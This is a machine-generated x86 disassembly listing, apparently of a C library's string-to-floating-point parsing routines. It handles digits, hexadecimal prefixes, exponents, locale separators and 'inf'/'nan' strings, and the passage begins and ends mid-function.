lea eax, [edx - 0x17]
lea edi, [var_54h]
mov dword [var_8h], esi
mov dword [var_ch], eax
lea eax, [var_2ch]
mov dword [var_4h], eax
mov eax, 1
sub eax, esi
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, dword [var_5ch]
neg edx
test edx, edx
mov dword [ebp + edx*4 - 0x54], eax
jle 0x808747c
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x80874e2
jmp 0x808747c
mov eax, 1
lea ecx, [esi*4]
mov edi, eax
shr ecx, 2
sub edi, esi
lea esi, [var_2ch]
lea edi, [ebp + edi*4 - 0x54]
cld
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_5ch]
test eax, eax
jle 0x808747c
lea edx, [var_54h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808751b
jmp 0x808747c
mov ecx, dword [var_5ch]
lea edi, [var_2ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808689f
mov dword [var_10h], edx
mov ecx, dword [var_a0h]
mov dword [var_8h], esi
mov edx, dword [var_a8h]
mov dword [var_ch], ecx
mov ecx, dword [var_a4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x8086849
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x80864a6
mov ecx, dword [var_80h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x8086765
mov eax, ecx
jmp 0x8086765
mov eax, dword [var_70h]
mov ecx, dword [arg_14h]
mov dword [var_9ch], 0
mov esi, 0x17
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x80875cf
inc dword [var_70h]
mov eax, dword [var_70h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x80875bc
cmp dl, 0x30
je 0x808774b
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8087737
inc dword [var_70h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a60c0]
dec dword [var_7ch]
mov dword [var_6ch], eax
mov eax, esi
sub eax, dword [var_6ch]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_6ch]
mov dword [var_54h], edx
mov edx, dword [var_80h]
lea eax, [ecx + edx*4]
add eax, dword [var_58h]
lea ebx, [eax - 5]
mov eax, dword [var_7ch]
mov dword [var_58h], ebx
test eax, eax
jle 0x8087683
mov eax, dword [var_9ch]
lea ebx, [ebp + eax*4 - 0x54]
mov ecx, dword [var_70h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8087649
mov eax, dword [var_94h]
add ecx, eax
mov dword [var_70h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8087723
inc dword [var_70h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x80876d3
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_7ch]
mov eax, dword [var_7ch]
test eax, eax
jle 0x8087683
mov eax, dword [var_9ch]
test eax, eax
jns 0x808762b
mov edi, dword [var_9ch]
test edi, edi
jle 0x80876a2
lea edx, [var_54h]
mov eax, dword [var_9ch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8087696
mov eax, dword [var_58h]
mov esi, dword [var_60h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], esi
lea eax, [var_54h]
mov dword [esp], eax
jmp 0x8086983
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_9ch]
js 0x80876fb
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808766f
xor eax, eax
mov ecx, dword [var_60h]
mov dword [var_10h], 0x1f
cmp dword [var_7ch], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_58h]
jmp 0x8086979
mov ecx, dword [arg_14h]
inc dword [var_70h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808765d
mov ecx, dword [arg_14h]
inc dword [var_70h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x80875ec
inc dword [var_70h]
mov ecx, dword [var_70h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808774b
jmp 0x80875d8
mov eax, dword [var_84h]
mov edx, dword [var_58h]
shl eax, 2
sub edx, eax
jmp 0x8086737
test al, al
jne 0x80866de
jmp 0x8086715
mov esi, esi
mov ecx, dword [var_88h]
movzx eax, byte [ecx + 1]
jmp 0x8087771
mov esi, dword [arg_ch]
test esi, esi
jne 0x80864a1
jmp 0x80864a6
mov edi, dword [arg_ch]
test edi, edi
je 0x80864a6
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x80864a6
mov eax, dword [var_88h]
movzx eax, byte [eax]
mov byte [var_fdh], al
mov edx, dword [var_7ch]
xor eax, eax
test edx, edx
mov dword [var_80h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_fdh], 0
mov dword [var_84h], eax
je 0x8087aca
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8087803
mov edx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80877ef
test al, al
jne 0x8087ac3
add edi, dword [var_94h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8087a88
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8087846
mov eax, dword [var_7ch]
sub eax, dword [var_80h]
cmp dword [var_84h], 0xffffffff
cmovne eax, dword [var_84h]
mov dword [var_84h], eax
inc dword [var_7ch]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8087825
cmp dword [var_64h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808786c
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808786c
cmp edx, 0x66
jle 0x8087825
cmp dword [var_64h], 0x10
mov dword [var_78h], edi
je 0x8087a7f
cmp dword [ecx + eax*4], 0x65
je 0x8087932
mov esi, dword [var_80h]
cmp dword [var_7ch], esi
jle 0x8087898
mov eax, dword [var_78h]
cmp byte [eax - 1], 0x30
je 0x808791e
mov ecx, dword [var_80h]
cmp dword [var_7ch], ecx
jne 0x8086680
mov eax, dword [var_7ch]
test eax, eax
jle 0x8086680
mov ebx, dword [var_58h]
test ebx, ebx
jns 0x8086680
cmp dword [var_64h], 0x10
je 0x8087905
mov eax, dword [var_78h]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x8087900
cmp cl, 0x30
jne 0x8086680
dec dword [var_7ch]
inc ebx
dec dword [var_78h]
mov esi, dword [var_7ch]
dec dword [var_80h]
mov dword [var_58h], ebx
test esi, esi
jle 0x8086680
test ebx, ebx
js 0x80878ba
jmp 0x8086680
lea esi, [esi]
dec dword [var_78h]
jmp 0x80878ba
mov esi, dword [var_78h]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x80878d2
jmp 0x8087900
dec dword [var_78h]
dec dword [var_7ch]
mov edx, dword [var_78h]
cmp byte [edx - 1], 0x30
je 0x808791e
jmp 0x8087898
inc edi
mov dword [var_98h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8087a73
cmp al, 0x2b
je 0x8087a6a
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8087a62
cmp dword [var_64h], 0x10
je 0x8087a32
mov edx, dword [var_98h]
test edx, edx
je 0x8087a21
mov edx, dword [var_80h]
add edx, 0x3d
mov eax, dword [var_58h]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_58h], ebx
jg 0x80879ba
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_58h], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808797b
mov eax, dword [var_98h]
test eax, eax
je 0x8087883
neg ebx
mov dword [var_58h], ebx
jmp 0x8087883
cmp dword [var_84h], 0xffffffff
je 0x8087a0e
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_98h]
test eax, eax
jne 0x8087a07
mov eax, dword [var_60h]
mov edx, 0x7f800000
test eax, eax
cmovne edx, dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x80879e9
mov eax, dword [arg_ch]
test eax, eax
je 0x8087a00
mov ecx, dword [arg_ch]
mov dword [ecx], edi
mov eax, edx
jmp 0x80863f6
mov edx, 0
jmp 0x80879e9
mov eax, dword [var_60h]
mov edx, 0
test eax, eax
cmovne edx, dword [0x80a6104]
jmp 0x80879e9
mov eax, dword [var_84h]
sub eax, dword [var_80h]
lea edx, [eax + 0x26]
jmp 0x808797b
mov ebx, dword [var_98h]
mov ecx, dword [var_80h]
test ebx, ebx
lea edx, [ecx*4 + 0x95]
jne 0x808797b
mov edx, dword [var_84h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x80]
jmp 0x808797b
mov edi, dword [var_78h]
jmp 0x8087883
inc edi
movzx esi, byte [edi]
jmp 0x8087952
mov dword [var_98h], 1
jmp 0x8087a6a
cmp dword [ecx + eax*4], 0x70
jmp 0x808787d
cmp dword [var_64h], 0x10
je 0x8087a9e
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808786c
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808786c
cmp edx, 0x66
jle 0x8087825
jmp 0x808786c
mov edx, esi
movsx eax, dl
jmp 0x8087a93
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
jmp 0x8087803
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
jmp 0x80865ec
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80865b5
cmp eax, 0x66
ja 0x80865b5
inc dword [var_7ch]
jmp 0x80865e6
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8087b2a
cmp dl, byte [ecx + 0x198]
jle 0x8086595
xor ebx, ebx
cmp byte [var_edh], 0
je 0x8086595
mov ecx, dword [var_88h]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8086595
mov edx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8087b42
jmp 0x8086595
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
jmp 0x8086580
mov ecx, esi
cmp cl, 0x30
jne 0x8086584
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8087b78
jmp 0x8086584
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808652e
add edi, 2
mov dword [var_64h], 0x10
movzx esi, byte [edi]
mov dword [var_90h], 0
jmp 0x808652e
test al, al
jne 0x8086388
jmp 0x8086378
mov edx, dword [var_88h]
movzx eax, byte [edx]
jmp 0x8087bb7
inc edi
movzx esi, byte [edi]
jmp 0x8086338
mov dword [var_60h], 1
jmp 0x8087bcf
jmp fcn.08087bf0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08086280
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xfffffc02
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x8087d66
mov ebx, 0xfffffc02
sub ebx, dword [var_10h]
cmp ebx, 0x35
jg 0x8087eeb
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x35
je 0x8087eb7
cmp ebx, 0x1f
jle 0x8087e87
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x8087cef
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x8087cd0
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x8087d5f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x8087d40
mov dword [var_10h], 0xfffffc01
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x8087dd3
test esi, esi
jne 0x8087e80
mov edx, dword [edi]
test dl, 1
jne 0x8087d90
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x8087dd3
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x8087e59
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x8087e59
mov eax, dword [edi + 4]
test eax, 0x200000
jne 0x8087e2e
cmp dword [var_10h], 0xfffffc01
je 0x8087e1b
cmp dword [var_10h], 0x400
jle 0x8087e00
mov eax, dword [var_14h]
test eax, eax
je 0x8087df1
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x8087de9
lea esi, [esi]
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d880
test eax, 0x100000
mov eax, 0xfffffc02
cmove eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x8087dd3
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_sp_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x100000
jmp 0x8087dd3
cmp ecx, ebx
je 0x8087dc0
xor edx, edx
dec esi
cmp edx, esi
jge 0x8087dc0
lea esi, [esi]
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x8087e70
jmp 0x8087dc0
mov edx, dword [edi]
jmp 0x8087d90
test ebx, ebx
jle 0x8087d5f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_sp_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x8087d5f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x14
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x8087ec6
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x8087d5f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x8087de9
lea esi, [esi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x8088080
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x8087f4b
mov eax, dword [arg_24h]
test eax, eax
je 0x8087f45
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x8088040
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x8087f20
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
jle 0x8088033
lea edx, [eax + edi]
cmp edx, 9
jg 0x8088033
imul esi, dword [eax*4 + 0x80a6120]
mov ecx, dword [arg_18h]
mov edx, dword [edx*4 + 0x80a6120]
mov dword [ecx], 0
mov ecx, dword [arg_14h]
mov eax, dword [ecx]
test eax, eax
jne 0x8087fb0
mov eax, dword [arg_10h]
mov dword [eax], esi
mov dword [ecx], 1
add esp, 0x18
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], edx
mov dword [var_8h], eax
mov edx, dword [arg_10h]
mov dword [var_4h], edx
mov dword [esp], edx
call fcn.0808cae0
mov dword [var_14h], eax
mov edi, dword [arg_10h]
mov eax, dword [arg_14h]
mov ecx, dword [eax]
add edi, 4
mov eax, dword [arg_10h]
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x8088019
dec ecx
je 0x8087ffd
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x8088019
dec ecx
jne 0x8087feb
mov eax, 1
add dword [var_14h], eax
je 0x8087fa6
mov edx, dword [arg_14h]
mov esi, dword [var_14h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8087fa6
cmp esi, edi
je 0x808802f
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808802f
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088024
xor eax, eax
jmp 0x8088002
mov edx, dword [edi*4 + 0x80a6120]
jmp 0x8087f92
nop
movzx eax, byte [eax + 1]
mov edx, 1
test al, al
je 0x8088070
lea esi, [esi]
cmp al, byte [edx + ebx]
jne 0x8088061
mov ecx, dword [arg_24h]
inc edx
movzx eax, byte [edx + ecx]
test al, al
jne 0x8088050
test al, al
jne 0x8087f45
add ebx, edx
jmp 0x8087f48
mov ecx, dword [arg_24h]
movzx eax, byte [ecx + 1]
jmp 0x8088061
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx]
test eax, eax
jne 0x808809d
mov ecx, dword [arg_10h]
mov dword [ecx], esi
mov dword [edx], 1
xor edi, edi
xor esi, esi
jmp 0x8087f29
mov dword [var_8h], eax
mov dword [var_ch], 0x3b9aca00
mov eax, dword [arg_10h]
mov dword [var_4h], eax
mov dword [esp], eax
call fcn.0808cae0
mov dword [var_10h], eax
mov edx, dword [arg_14h]
mov edi, dword [arg_10h]
mov eax, dword [arg_10h]
mov ecx, dword [edx]
add edi, 4
mov edx, dword [eax]
lea eax, [edx + esi]
mov esi, dword [arg_10h]
cmp eax, edx
mov dword [esi], eax
mov esi, edi
jae 0x808810e
dec ecx
je 0x80880f2
lea esi, [esi]
mov edx, dword [edi]
add edi, 4
inc edx
mov dword [esi], edx
add esi, 4
test edx, edx
jne 0x808810e
dec ecx
jne 0x80880e0
mov eax, 1
add dword [var_10h], eax
je 0x8088094
mov edx, dword [arg_14h]
mov esi, dword [var_10h]
mov ecx, dword [arg_10h]
mov eax, dword [edx]
mov dword [ecx + eax*4], esi
inc dword [edx]
jmp 0x8088094
cmp esi, edi
je 0x808812b
xor edx, edx
dec ecx
cmp edx, ecx
jge 0x808812b
lea esi, [esi]
mov eax, dword [edi + edx*4]
mov dword [esi + edx*4], eax
inc edx
cmp edx, ecx
jl 0x8088120
xor eax, eax
jmp 0x80880f7
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x22c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_168h], 0xa
mov dword [var_190h], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x8088189
mov ecx, dword [edx + 0x2c]
mov dword [var_194h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x8088189
cmp al, 0x7f
je 0x8088189
mov esi, dword [edx + 0x28]
mov dword [var_190h], esi
cmp byte [esi], 0
jne 0x8088193
mov dword [var_190h], 0
mov dword [var_194h], 0
mov edx, dword [edx + 0x24]
mov dword [var_18ch], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_170h], 0
mov dword [var_198h], eax
mov dword [var_15ch], 0
mov dword [var_164h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x80881d2
cmp cl, 0x2d
je 0x8089f3c
cmp cl, 0x2b
je 0x8089f33
mov edx, dword [var_18ch]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_206h], dl
mov byte [var_205h], dl
je 0x8089f28
mov eax, edx
cmp byte [ebx + edi], al
jne 0x8089f1b
mov ecx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088215
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x808823d
cmp al, 0x39
jle 0x808840a
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808840a
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x808838c
cmp dword [ecx + ebx*4], 0x6e
jne 0x8088376
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8088376
fld dword [0x80a61a4]
add edi, 3
fstp qword [ebp - 0x1a0]
cmp byte [edi], 0x28
je 0x80882c1
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b0
mov eax, dword [arg_ch]
mov dword [eax], edi
fld qword [ebp - 0x1a0]
add esp, 0x22c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x80882c9
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x80882e4
cmp eax, 0x7a
jle 0x80882c9
cmp dl, 0x5f
je 0x80882c9
cmp dl, 0x29
je 0x80882f2
mov edi, ebx
jmp 0x80882a4
mov edx, dword [arg_14h]
lea eax, [var_150h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_150h], edi
mov ecx, eax
mov ebx, edx
jne 0x80882a4
fld qword [ebp - 0x1a0]
and edx, 0xfffff
mov esi, edx
or esi, eax
fstp qword [ebp - 0x1a8]
jne 0x808834d
xor ecx, ecx
mov ebx, 0x80000
mov eax, ebx
mov dword [var_1a8h], ecx
and eax, 0xfffff
or eax, 0x7ff00000
mov dword [var_1a4h], eax
fld qword [ebp - 0x1a8]
fstp qword [ebp - 0x1a0]
jmp 0x80882a4
mov eax, dword [arg_ch]
test eax, eax
je 0x8088385
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
fldz
jmp 0x80882b6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x80883ff
mov eax, dword [arg_ch]
test eax, eax
je 0x80883df
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov edx, dword [var_164h]
test edx, edx
je 0x80883f4
fld dword [0x80a6100]
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x80882b6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x808825f
mov eax, esi
cmp al, 0x30
je 0x8089ee8
mov eax, dword [var_190h]
mov dword [var_178h], edi
test eax, eax
je 0x8089ece
mov ecx, dword [var_190h]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8088465
xor ebx, ebx
test dl, dl
je 0x8089ec0
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
lea esi, [esi]
mov ecx, esi
cmp cl, al
jne 0x808846b
mov ecx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8088450
inc edi
movzx esi, byte [edi]
jmp 0x8088431
test al, al
je 0x8088465
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8088483
cmp dword [var_168h], 0x10
je 0x8089e6b
mov dword [var_174h], edi
mov dword [var_180h], 0
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089e60
cmp dword [var_168h], 0x10
je 0x8089e3e
mov eax, dword [var_190h]
test eax, eax
je 0x80884ea
mov ecx, dword [var_190h]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8089e30
cmp al, byte [ebx + edi]
jne 0x80884e6
mov edx, dword [var_190h]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80884c8
lea esi, [esi]
inc edi
movzx esi, byte [edi]
jmp 0x8088493
test al, al
je 0x80884e0
mov eax, dword [var_194h]
test eax, eax
je 0x8089aa5
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x8089aa5
mov ecx, dword [var_178h]
mov eax, dword [var_194h]
mov dword [var_4h], edi
mov edx, dword [var_190h]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x8089a96
cmp eax, dword [var_178h]
je 0x8089a7e
cmp eax, dword [var_174h]
jb 0x8089a6e
mov ecx, dword [var_174h]
mov edi, eax
mov dword [var_180h], 0
cmp ecx, eax
jae 0x8088585
movzx eax, byte [ecx]
mov edx, dword [var_180h]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_180h]
inc ecx
cmp ecx, edi
mov dword [var_180h], edx
jb 0x8088564
mov ecx, dword [var_180h]
mov dword [var_188h], 0
mov dword [var_184h], ecx
mov edx, dword [arg_ch]
test edx, edx
je 0x80885a7
mov edx, dword [arg_ch]
mov dword [edx], edi
mov eax, dword [var_180h]
test eax, eax
jne 0x80885ca
mov eax, dword [var_164h]
test eax, eax
je 0x8088385
fld dword [0x80a6104]
jmp 0x80882b6
mov eax, dword [var_188h]
test eax, eax
je 0x808867c
mov ecx, dword [var_18ch]
mov esi, dword [var_18ch]
movzx ecx, byte [ecx]
mov byte [var_206h], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_174h]
movzx eax, byte [var_206h]
cmp byte [ecx], al
je 0x808860a
inc dword [var_174h]
jmp 0x80885f1
test dl, dl
mov ebx, 1
je 0x8089a62
mov esi, dword [var_18ch]
movzx eax, byte [esi + 1]
mov ecx, dword [var_174h]
cmp al, byte [ebx + ecx]
jne 0x8089a55
mov esi, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x8088621
mov eax, dword [var_188h]
add eax, dword [var_198h]
add dword [var_174h], eax
cmp dword [var_168h], 0x10
je 0x8089a3f
mov edx, dword [var_15ch]
sub edx, dword [var_188h]
mov esi, dword [var_188h]
mov dword [var_15ch], edx
sub dword [var_180h], esi
cmp dword [var_168h], 0x10
je 0x8089827
mov ebx, dword [var_15ch]
test ebx, ebx
mov edx, ebx
js 0x808980e
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp ebx, eax
